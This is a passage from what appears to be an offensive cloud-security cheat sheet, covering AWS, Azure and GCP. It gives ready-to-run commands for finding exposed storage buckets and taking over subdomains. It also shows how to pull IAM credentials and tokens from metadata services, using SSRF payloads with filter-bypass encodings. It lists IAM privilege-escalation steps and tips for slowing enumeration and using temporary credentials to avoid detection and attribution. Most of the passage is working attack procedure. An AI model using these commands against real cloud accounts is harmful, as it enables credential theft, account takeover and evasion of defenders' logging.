**Azure Blob Discovery**

**Subdomain Enumeration**

```bash
# Generate storage account names
for word in $(cat wordlist.txt); do
  echo "$word.blob.core.windows.net"
done > azure-storage.txt

# Test storage accounts
while read storage; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$storage")
  if [ "$response" != "404" ]; then
    echo "[+] Found: $storage ($response)"
  fi
done < azure-storage.txt
```

**Common Container Names**

```
backup
backups
data
files
images
logs
public
private
assets
media
uploads
documents
```

**MicroBurst (Azure Security Toolkit)**

```powershell
# Install
Install-Module -Name MicroBurst -Force

# Enumerate storage accounts
Invoke-EnumerateAzureBlobs -Base <keyword>

# Check for public containers
Get-AzureStorageAccount | Get-AzureStorageContainer | Where-Object {$_.PublicAccess -ne "Off"}
```

**Google Dorking for Azure Blob**

```
site:blob.core.windows.net "example"
inurl:"blob.core.windows.net" filetype:pdf
site:blob.core.windows.net intitle:"index of"
```

### Cloud Storage Security Issues

**Publicly Accessible Buckets/Containers**

Misconfigurations that allow public read access:

**AWS S3**

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
```

**GCS**

```json
{
  "bindings": [{
    "role": "roles/storage.objectViewer",
    "members": ["allUsers"]
  }]
}
```

**Azure Blob**

```
Container Public Access Level: Blob (anonymous read access for blobs only)
Container Public Access Level: Container (anonymous read access for containers and blobs)
```

**Publicly Writable Buckets**

More severe misconfigurations allowing public write access:

```bash
# Test S3 write access
echo "test" > test.txt
aws s3 cp test.txt s3://<bucket-name>/test.txt --no-sign-request

# Test GCS write access
echo "test" > test.txt
gsutil cp test.txt gs://<bucket-name>/test.txt

# Test Azure write access
az storage blob upload --account-name <storage-account> --container-name <container> --file test.txt --name test.txt
```

**Sensitive Data Exposure**

Common sensitive files found in misconfigured buckets:

```bash
# Database dumps
*.sql
*.dump
*.bak
database.backup

# Configuration files
*.config
*.env
.env
config.php
wp-config.php
web.config

# Credentials
credentials.txt
passwords.txt
*.pem
*.key
id_rsa
*.pfx
*.p12

# Source code
*.git
*.svn
source.zip
backup.tar.gz

# Personal data
users.csv
customers.xlsx
*.pdf (invoices, reports)
```

**Automated Content Discovery**

```bash
# Search for sensitive files in S3
aws s3 ls s3://<bucket-name> --recursive | grep -E "\.(sql|dump|bak|key|pem|env|config)$"

# Download and analyze
aws s3 sync s3://<bucket-name> ./bucket-dump --no-sign-request
grep -r "password" ./bucket-dump
grep -r "api_key" ./bucket-dump
grep -r "secret" ./bucket-dump
```

### Multi-Cloud Enumeration Tools

**CloudSploit**

```bash
# Install
git clone https://github.com/aquasecurity/cloudsploit
cd cloudsploit
npm install

# Scan AWS
./index.js --config ./config.js

# Scan Azure
./index.js --cloud azure --config ./azure-config.js

# Scan GCP
./index.js --cloud gcp --config ./gcp-config.js
```

**ScoutSuite**

```bash
# Install
pip install scoutsuite

# Scan AWS
scout aws --profile <profile-name>

# Scan Azure
scout azure --cli

# Scan GCP
scout gcp --user-account

# Scan multiple providers
scout all --profile <aws-profile> --cli --user-account
```

**Prowler**

```bash
# Install
git clone https://github.com/prowler-cloud/prowler
cd prowler
pip install -r requirements.txt

# Scan AWS
./prowler -p <profile-name>

# Specific checks
./prowler -c check22,check23

# Output formats
./prowler -p <profile-name> -M json
./prowler -p <profile-name> -M html
```

**CloudMapper**

```bash
# Install
git clone https://github.com/duo-labs/cloudmapper
cd cloudmapper
pip install -r requirements.txt

# Configure
python cloudmapper.py configure add-account --config-file config.json --name <account-name> --id <account-id>

# Collect data
python cloudmapper.py collect --account <account-name>

# Generate visualization
python cloudmapper.py prepare --account <account-name>
python cloudmapper.py webserver
```

**CloudBrute**

```bash
# Install
git clone https://github.com/0xsha/CloudBrute
cd CloudBrute
go build

# Scan for AWS S3
./CloudBrute -d example.com -k s3 -w wordlist.txt

# Scan for Azure
./CloudBrute -d example.com -k azure -w wordlist.txt

# Scan for GCP
./CloudBrute -d example.com -k gcs -w wordlist.txt

# All cloud providers
./CloudBrute -d example.com -k all -w wordlist.txt
```

**Cloud_enum**

```bash
# Install
git clone https://github.com/initstring/cloud_enum
cd cloud_enum
pip3 install -r requirements.txt

# Enumerate all cloud resources
python3 cloud_enum.py -k example

# Specific keywords
python3 cloud_enum.py -k example,company,prod -l output.txt

# Mutations
python3 cloud_enum.py -k example -m mutations.txt
```

### Bucket Takeover Scenarios

**Subdomain Takeover via S3**

If a DNS record points to a non-existent S3 bucket, the bucket can be claimed:

```bash
# Discover pointing to non-existent bucket
dig subdomain.example.com
# CNAME: subdomain.example.com.s3.amazonaws.com

# Test if bucket exists
curl -I https://subdomain.example.com
# 404 NoSuchBucket

# Create bucket with that name
aws s3 mb s3://subdomain.example.com --region us-east-1

# Configure for web hosting
aws s3 website s3://subdomain.example.com --index-document index.html

# Upload content
echo "<h1>Subdomain Takeover</h1>" > index.html
aws s3 cp index.html s3://subdomain.example.com/

# Make public
aws s3api put-bucket-policy --bucket subdomain.example.com --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::subdomain.example.com/*"
  }]
}'
```

[Inference: Bucket takeover success depends on the bucket name being unclaimed across all AWS accounts globally. AWS prevents reuse of recently deleted bucket names for a period, and some bucket names may be reserved.]

**GCS Subdomain Takeover**

```bash
# Discover CNAME to non-existent GCS bucket
dig subdomain.example.com
# CNAME: c.storage.googleapis.com

# Create bucket
gsutil mb gs://subdomain.example.com

# Make public
gsutil iam ch allUsers:objectViewer gs://subdomain.example.com

# Upload content
echo "<h1>Takeover</h1>" > index.html
gsutil cp index.html gs://subdomain.example.com/
```

**Azure Subdomain Takeover**

```bash
# Discover orphaned Azure resource
dig subdomain.example.com
# CNAME: subdomain.cloudapp.azure.com (or blob.core.windows.net)

# Claim the resource name
az vm create --name subdomain --resource-group mygroup --location eastus

# Or create storage account
az storage account create --name subdomain --resource-group mygroup
```

### Kubernetes and Cloud Integration Enumeration

**AWS IAM Roles for Service Accounts (IRSA)**

When pods use IRSA, they have AWS credentials via service account tokens.

```bash
# From within pod
env | grep AWS

# AWS credential location
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Identify role ARN
curl -H "Authorization: $(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Use credentials
export AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
export AWS_ROLE_ARN=<role-arn>
aws sts get-caller-identity
aws s3 ls
```

**GCP Workload Identity**

Pods in GKE can assume GCP service accounts:

```bash
# From within pod
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get token
TOKEN=$(curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)

# Use token with gcloud
gcloud auth activate-service-account --access-token-file=<(echo $TOKEN)
gcloud projects list
gsutil ls
```

**Azure Managed Identity**

AKS pods can use Azure Managed Identity:

```bash
# From within pod
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get token
TOKEN=$(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# Use with Azure CLI
az login --identity
az account show
az storage account list
```

### Cloud Metadata Service Exploitation

**AWS EC2 Metadata (IMDSv1)**

```bash
# Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# User data (may contain secrets)
curl http://169.254.169.254/latest/user-data

# Instance identity document
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

**AWS EC2 Metadata (IMDSv2 - Protected)**

```bash
# Get session token (required for IMDSv2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**SSRF to Metadata Service**

When exploiting SSRF vulnerabilities, metadata services are prime targets:

```bash
# Via SSRF in web application
http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# With redirect bypass
http://vulnerable-app.com/fetch?url=http://169.254.169.254.nip.io/latest/meta-data/

# With DNS rebinding
# Configure DNS to first resolve to allowed IP, then to 169.254.169.254
```

**GCP Metadata SSRF**

```bash
# Via SSRF
http://vulnerable-app.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Must include Metadata-Flavor header (can be tricky via SSRF)

# Alternative endpoints
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure Metadata SSRF**

```bash
# Via SSRF
http://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Must include Metadata:true header
```

### Defense Evasion in Cloud Environments

**Avoiding CloudTrail/Activity Logs**

[Inference: While complete avoidance of cloud logging is generally not possible for authenticated actions, certain techniques may reduce log visibility or complicate attribution. However, cloud providers continuously improve logging coverage.]

**Rate Limiting and Throttling**

```bash
# Slow enumeration to avoid rate limits and detection
for bucket in $(cat buckets.txt); do
  aws s3 ls s3://$bucket --no-sign-request
  sleep $((5 + RANDOM % 10))  # Random delay 5-15 seconds
done
```

**Using Temporary Credentials**

```bash
# AWS STS temporary credentials (harder to track back to source)
aws sts assume-role --role-arn <role-arn> --role-session-name test

# Federated access
aws sts get-federation-token --name temp-user
```

**Regional Distribution**

```bash
# Distribute requests across regions
regions=(us-east-1 us-west-1 eu-west-1 ap-southeast-1)
for region in "${regions[@]}"; do
  aws s3 ls --region $region
done
```

---

## Key Operational Considerations

**Cloud Provider Differences**: Each cloud provider has distinct APIs, authentication mechanisms, and security controls. AWS uses IAM with access keys, GCP uses service accounts with OAuth tokens, Azure uses managed identities and SAS tokens. Tools and techniques must be adapted for each environment.

**Kubernetes RBAC Complexity**: Kubernetes Role-Based Access Control is highly granular. A service account with limited permissions in one namespace might have broad permissions in another. Comprehensive enumeration requires testing permissions across all namespaces and resource types.

**Container Registry Security**: Private registries should enforce authentication, but many implementations have misconfigurations. Common issues include:

- Anonymous read access enabled
- Weak or default credentials
- Publicly accessible registries on non-standard ports
- Lack of vulnerability scanning

**Cloud Storage Misconfiguration**: Public cloud storage buckets remain a prevalent security issue. Reasons include:

- Misunderstanding of access control models
- Legacy configurations from before provider security improvements
- Testing/development buckets promoted to production
- Automated infrastructure deployment with insecure defaults

**Metadata Service Protection**: [Unverified: AWS IMDSv2 requires a session token obtained via PUT request, which cannot be performed through simple SSRF in most cases. However, more sophisticated SSRF exploitation may still access metadata services depending on the specific vulnerability context.]

**Audit Logging**: All major cloud providers log API calls and access attempts:

- AWS CloudTrail
- GCP Cloud Audit Logs
- Azure Activity Log

Enumeration activities generate extensive logs that security teams may review. Operational security requires balancing thoroughness with detection risk.

**Credential Scope**: Cloud credentials may have broad permissions across multiple services. Compromised Kubernetes service account tokens might provide access to cloud storage, databases, and other resources beyond the container environment. Always enumerate the full scope of compromised credentials.

---

## IAM Role Enumeration

IAM (Identity and Access Management) role enumeration identifies permissions, policies, and access configurations in cloud environments. This section focuses primarily on AWS but includes Azure and GCP contexts where applicable.

### AWS IAM Enumeration

**Determine Current Identity**

```bash
# Get caller identity
aws sts get-caller-identity

# Output includes:
# - UserId
# - Account
# - Arn (Amazon Resource Name)

# Extract account ID
aws sts get-caller-identity --query Account --output text

# Get access key information
aws sts get-access-key-info --access-key-id AKIAIOSFODNN7EXAMPLE
```

**Enumerate Attached Policies**

```bash
# List all IAM users (requires permissions)
aws iam list-users

# Get specific user details
aws iam get-user --user-name username

# List user's policies
aws iam list-user-policies --user-name username

# List attached managed policies
aws iam list-attached-user-policies --user-name username

# Get inline policy document
aws iam get-user-policy --user-name username --policy-name policy-name

# Get managed policy version
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/PolicyName
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/PolicyName --version-id v1
```

**Enumerate IAM Roles**

```bash
# List all roles
aws iam list-roles

# Get specific role
aws iam get-role --role-name role-name

# List role policies
aws iam list-role-policies --role-name role-name

# List attached managed policies for role
aws iam list-attached-role-policies --role-name role-name

# Get role policy document
aws iam get-role-policy --role-name role-name --policy-name policy-name

# Assume role (if permitted)
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/RoleName --role-session-name session-name
```

**Enumerate Groups**

```bash
# List all groups
aws iam list-groups

# List groups for user
aws iam list-groups-for-user --user-name username

# Get group policy
aws iam list-group-policies --group-name group-name

# Get attached group policies
aws iam list-attached-group-policies --group-name group-name
```

**Permission Boundary Analysis**

```bash
# Check if user has permission boundary
aws iam get-user --user-name username | grep PermissionsBoundary

# Get permission boundary policy
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/BoundaryPolicy
aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/BoundaryPolicy --version-id v1
```

### AWS Policy Simulation and Testing

**IAM Policy Simulator**

```bash
# Simulate policy evaluation
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::123456789012:user/username \
    --action-names s3:GetObject s3:PutObject \
    --resource-arns arn:aws:s3:::bucket-name/*

# Simulate custom policy document
aws iam simulate-custom-policy \
    --policy-input-list file://policy.json \
    --action-names ec2:DescribeInstances \
    --resource-arns '*'
```

**Test Specific Permissions**

```bash
# Test S3 access
aws s3 ls s3://bucket-name 2>&1

# Test EC2 permissions
aws ec2 describe-instances 2>&1

# Test Lambda permissions
aws lambda list-functions 2>&1

# Test IAM permissions
aws iam list-users 2>&1

# Test Secrets Manager
aws secretsmanager list-secrets 2>&1

# Test Systems Manager Parameter Store
aws ssm describe-parameters 2>&1
```

### Automated AWS Enumeration Tools

**Enumerate-IAM** - Brute force IAM permissions

```bash
# Install
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt

# Run enumeration
python3 enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Specify region
python3 enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key SECRET --region us-east-1
```

**Pacu** - AWS exploitation framework

```bash
# Install
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Create new session
Pacu > new

# Set keys
Pacu > set_keys
Pacu > import_keys --profile default

# Run IAM enumeration modules
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run iam__enum_permissions
Pacu > run iam__bruteforce_permissions

# Enumerate all accessible services
Pacu > run iam__detect_honeytokens
Pacu > whoami
```

**ScoutSuite** - Multi-cloud security auditing

```bash
# Install
pip3 install scoutsuite

# Run AWS assessment
scout aws --profile default

# Specific services only
scout aws --services iam,s3,ec2

# Output to specific directory
scout aws --report-dir ./aws-report

# No browser (headless)
scout aws --no-browser
```

**Prowler** - AWS security best practices assessment

```bash
# Install
git clone https://github.com/prowler-cloud/prowler
cd prowler
pip3 install -r requirements.txt

# Run all checks
./prowler -M csv,html

# IAM-specific checks
./prowler -g iam

# Specific check
./prowler -c check11  # Check for root account usage

# Use specific profile
./prowler -p profile-name
```

**CloudMapper** - AWS network visualization

```bash
# Install
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip3 install -r requirements.txt

# Configure
python3 cloudmapper.py configure add-account --config-file config.json --name account-name --id 123456789012

# Collect data
python3 cloudmapper.py collect --account account-name

# Prepare web interface
python3 cloudmapper.py prepare --account account-name

# Serve visualization
python3 cloudmapper.py webserver
# Access: http://127.0.0.1:8000
```

### AWS Privilege Escalation Vectors

**Common Escalation Paths** [Inference] These techniques require existing AWS credentials with specific limited permissions.

```bash
# 1. iam:CreateAccessKey - Create access key for another user
aws iam create-access-key --user-name target-user

# 2. iam:CreateLoginProfile - Create console password
aws iam create-login-profile --user-name target-user --password NewPassword123!

# 3. iam:UpdateLoginProfile - Change password
aws iam update-login-profile --user-name target-user --password NewPassword123!

# 4. iam:AttachUserPolicy - Attach admin policy
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 5. iam:PutUserPolicy - Add inline policy
aws iam put-user-policy --user-name current-user --policy-name AdminPolicy --policy-document file://admin-policy.json

# 6. iam:AssumeRole - Assume privileged role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name session

# 7. lambda:UpdateFunctionCode - Modify Lambda with privileged role
aws lambda update-function-code --function-name privileged-function --zip-file fileb://malicious.zip

# 8. iam:PassRole + ec2:RunInstances - Create instance with privileged role
aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=AdminRole

# 9. iam:SetDefaultPolicyVersion - Revert to previous policy version
aws iam set-default-policy-version --policy-arn arn:aws:iam::123456789012:policy/Policy --version-id v2

# 10. sts:AssumeRole via EC2 instance profile (from compromised instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

### Azure AD/Entra ID Enumeration

**Azure CLI Enumeration**

```bash
# Login
az login

# Get current account
az account show

# List subscriptions
az account list

# Get access token
az account get-access-token

# List all users
az ad user list

# Get specific user
az ad user show --id user@domain.com

# List groups
az ad group list

# Get group members
az ad group member list --group group-name

# List service principals
az ad sp list --all

# Get service principal details
az ad sp show --id <app-id>

# List role assignments
az role assignment list

# List role assignments for current user
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv)

# List role definitions
az role definition list
```

**Azure AD PowerShell Enumeration**

```powershell
# Install module
Install-Module AzureAD

# Connect
Connect-AzureAD

# Get current user
Get-AzureADCurrentSessionInfo

# List all users
Get-AzureADUser -All $true

# Get user details
Get-AzureADUser -ObjectId user@domain.com

# List groups
Get-AzureADGroup -All $true

# Get group members
Get-AzureADGroupMember -ObjectId <group-id>

# List service principals
Get-AzureADServicePrincipal -All $true

# Get role assignments
Get-AzureADDirectoryRole
Get-AzureADDirectoryRoleMember -ObjectId <role-id>

# List applications
Get-AzureADApplication -All $true

# Get OAuth permissions
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalOAuth2PermissionGrant
```

**ROADtools** - Azure AD reconnaissance

```bash
# Install
pip3 install roadrecon

# Authenticate and gather data
roadrecon auth -u user@domain.com -p password
roadrecon gather

# Generate GUI
roadrecon gui

# Access: http://127.0.0.1:5000

# Query specific data
roadrecon plugin policies  # Conditional access policies
```

**AzureHound** - Azure AD BloodHound collector

```bash
# Install
pip3 install azurehound

# Collect data
azurehound -u user@domain.com -p password -t tenant.onmicrosoft.com

# Output to JSON for BloodHound
azurehound -u user@domain.com -p password -t tenant.onmicrosoft.com -o output.json

# Use with refresh token
azurehound -r <refresh-token> -t tenant.onmicrosoft.com
```

### GCP IAM Enumeration

**gcloud CLI Enumeration**

```bash
# Authenticate
gcloud auth login

# Get current configuration
gcloud config list

# Get current account
gcloud auth list

# Get project information
gcloud projects list
gcloud projects describe PROJECT_ID

# List IAM policy bindings
gcloud projects get-iam-policy PROJECT_ID

# Get service accounts
gcloud iam service-accounts list

# Get service account keys
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com

# List roles
gcloud iam roles list

# Get role details
gcloud iam roles describe roles/viewer

# Test permissions
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --filter="bindings.members:user:email@domain.com"
```

**GCP Privilege Escalation**

```bash
# 1. iam.serviceAccounts.getAccessToken - Impersonate service account
gcloud iam service-accounts get-access-token sa@project.iam.gserviceaccount.com

# 2. iam.serviceAccountKeys.create - Create service account key
gcloud iam service-accounts keys create key.json --iam-account=sa@project.iam.gserviceaccount.com

# 3. iam.roles.update - Modify custom role
gcloud iam roles update CustomRole --project=PROJECT_ID --add-permissions=compute.instances.create

# 4. compute.instances.setServiceAccount - Attach privileged SA to instance
gcloud compute instances set-service-account INSTANCE --service-account=admin-sa@project.iam.gserviceaccount.com
```

---

## Cloud Metadata Service Exploitation

Cloud metadata services provide instance-specific information including IAM credentials, instance details, and configuration data. These services are accessible from within cloud instances and are frequently targeted for privilege escalation and lateral movement.

### AWS Instance Metadata Service (IMDS)

**IMDSv1 (Legacy)**

```bash
# Base URL
METADATA_URL="http://169.254.169.254/latest/meta-data/"

# Get instance ID
curl http://169.254.169.254/latest/meta-data/instance-id

# Get instance type
curl http://169.254.169.254/latest/meta-data/instance-type

# Get availability zone
curl http://169.254.169.254/latest/meta-data/placement/availability-zone

# Get public IPv4
curl http://169.254.169.254/latest/meta-data/public-ipv4

# Get security groups
curl http://169.254.169.254/latest/meta-data/security-groups

# Get user data (may contain secrets)
curl http://169.254.169.254/latest/user-data

# List available metadata
curl http://169.254.169.254/latest/meta-data/
```

**IAM Role Credentials Extraction (IMDSv1)**

```bash
# List available IAM roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials for role
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Output includes:
# - AccessKeyId
# - SecretAccessKey
# - Token
# - Expiration

# Export as environment variables
export AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME | jq -r '.Token')

# Verify credentials
aws sts get-caller-identity
```

**IMDSv2 (Session-Oriented)** IMDSv2 requires a session token to access metadata, providing defense against SSRF attacks.

```bash
# Get session token (TTL in seconds, max 21600)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token in subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id

# Get IAM credentials with IMDSv2
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

**SSRF to IMDS Exploitation**

```bash
# Typical SSRF payload
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# URL-encoded version
http://169.254.169.254/latest/meta-data/iam/security-credentials%2F

# Alternative encodings to bypass filters
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/
http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/  # Hex encoding
http://2852039166/latest/meta-data/iam/security-credentials/  # Decimal encoding

# DNS rebinding
# Use services like 169.254.169.254.nip.io or set up custom DNS

# Via redirect (if application follows redirects)
# Setup server that redirects to IMDS
```

**Automated IMDS Exploitation**

```bash
# Pacu module
Pacu > run ec2__enum_instance_metadata

# Manual script
#!/bin/bash
METADATA_BASE="http://169.254.169.254/latest/meta-data/"

echo "[+] Enumerating IMDS..."

echo "[*] Instance ID:"
curl -s ${METADATA_BASE}instance-id

echo "[*] Instance Type:"
curl -s ${METADATA_BASE}instance-type

echo "[*] IAM Role:"
ROLE=$(curl -s ${METADATA_BASE}iam/security-credentials/)
echo $ROLE

if [ ! -z "$ROLE" ]; then
    echo "[*] IAM Credentials:"
    curl -s ${METADATA_BASE}iam/security-credentials/$ROLE | jq .
fi

echo "[*] User Data:"
curl -s http://169.254.169.254/latest/user-data

echo "[*] Security Groups:"
curl -s ${METADATA_BASE}security-groups
```

### Azure Instance Metadata Service (IMDS)

**Basic Metadata Retrieval**

```bash
# Base URL (requires specific API version)
METADATA_URL="http://169.254.169.254/metadata"

# Get instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get compute information
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | jq .

# Get network information
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | jq .

# Get specific field
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text"
```

**Azure Managed Identity Token Extraction**

```bash
# Get access token for Azure Resource Manager
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Output includes:
# - access_token
# - expires_in
# - token_type

# Get token for specific resource
# Azure Resource Manager
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure Key Vault
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Azure Storage
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Microsoft Graph API
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Extract and use token
TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

# Use token to list resources
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**User-Assigned vs System-Assigned Identities**

```bash
# System-assigned identity (default)
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# User-assigned identity (specify client_id or object_id)
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>"

# Using object_id
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&object_id=<object-id>"

# Using msi_res_id (resource ID)
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&msi_res_id=/subscriptions/<sub-id>/resourcegroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<identity-name>"
```

**SSRF to Azure IMDS**

```bash
# Basic SSRF payload (requires Metadata header)
# [Inference] Unlike AWS, Azure IMDS requires "Metadata: true" header, making SSRF exploitation more challenging

# Possible vectors if attacker can control headers:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# URL encoding
http://169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2018-02-01%26resource%3Dhttps://management.azure.com/
```

### GCP Metadata Service

**Basic Metadata Retrieval**

```bash
# Base URL
METADATA_URL="http://metadata.google.internal/computeMetadata/v1/"

# Get project ID
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id

# Get instance ID
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/id

# Get instance name
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name

# Get instance zone
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/zone

# Get instance attributes
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/

# Get custom metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/custom-key

# Recursive listing
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/?recursive=true
```

**Service Account Token Extraction**

```bash
# List service accounts
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Get default service account
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Get access token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Output includes:
# - access_token
# - expires_in
# - token_type

# Get token with specific scopes
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform"

# Get identity token (JWT)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com"

# Extract and use token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r '.access_token')

# Use token with gcloud
gcloud config set auth/access_token_file <(echo $TOKEN)
gcloud projects list

# Use token with API calls
curl -H "Authorization: Bearer $TOKEN" https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances
```

**Startup and Shutdown Scripts**

```bash
# Get startup script (may contain secrets)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# Get shutdown script
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/shutdown-script

# Get SSH keys
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

**SSRF to GCP Metadata**

```bash
# Basic SSRF payload
